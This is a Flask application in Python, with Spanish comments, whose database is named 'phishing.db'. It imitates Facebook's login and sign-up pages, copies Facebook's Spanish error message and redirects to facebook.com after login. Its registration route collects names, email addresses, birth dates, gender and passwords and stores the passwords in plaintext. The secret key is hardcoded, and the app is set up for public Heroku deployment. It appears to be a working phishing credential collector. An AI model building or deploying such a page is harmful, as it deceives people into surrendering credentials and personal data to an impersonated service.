import sqlite3
from flask import Flask, render_template, request, redirect, flash

app = Flask(__name__)
app.secret_key = '222'  # Necesaria para usar flash y session

DB_NAME = 'phishing.db'

# Crear tabla si no existe
def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS usuario (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nombre TEXT NOT NULL,
            apellido TEXT NOT NULL,
            correo TEXT NOT NULL UNIQUE,
            contrasena TEXT NOT NULL,
            nacimiento TEXT NOT NULL,
            genero TEXT NOT NULL
        )
    ''')
    conn.commit()
    cursor.close()
    conn.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    correo = request.form['correo']
    contrasena = request.form['contrasena']

    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute('SELECT contrasena FROM usuario WHERE correo = ?', (correo,))
    result = cursor.fetchone()

    if result:
        if result[0] == contrasena:
            cursor.close()
            conn.close()
            return redirect("https://www.facebook.com/")
        else:
            cursor.close()
            conn.close()
            flash("Contraseña incorrecta.")
            return redirect('/')
    else:
        cursor.close()
        conn.close()
        flash("El correo electrónico o número de móvil que has introducido no está conectado a una cuenta. Encuentra tu cuenta e inicia sesión.")
        return redirect('/')

@app.route('/register', methods=['POST'])
def register():
    nombre = request.form['nombre']
    apellido = request.form['apellido']
    correo = request.form['correo']
    contrasena = request.form['contrasena']
    nacimiento = request.form['nacimiento']
    genero = request.form['genero']

    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    # Verificar si ya existe el correo
    cursor.execute('SELECT id FROM usuario WHERE correo = ?', (correo,))
    if cursor.fetchone():
        cursor.close()
        conn.close()
        return "Este correo ya está registrado. <a href='/create_account'>Volver</a>"

    # Insertar datos en la tabla usuario
    cursor.execute('''
        INSERT INTO usuario (nombre, apellido, correo, contrasena, nacimiento, genero)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (nombre, apellido, correo, contrasena, nacimiento, genero))

    conn.commit()
    cursor.close()
    conn.close()

    return redirect('/')

@app.route('/create_account')
def create_account():
    return render_template('create_account.html')

if __name__ == '__main__':
    init_db()
    import os
    port = int(os.environ.get("PORT", 5000))  # Puerto que Heroku asigna
    app.run(host="0.0.0.0", port=port, debug=False)

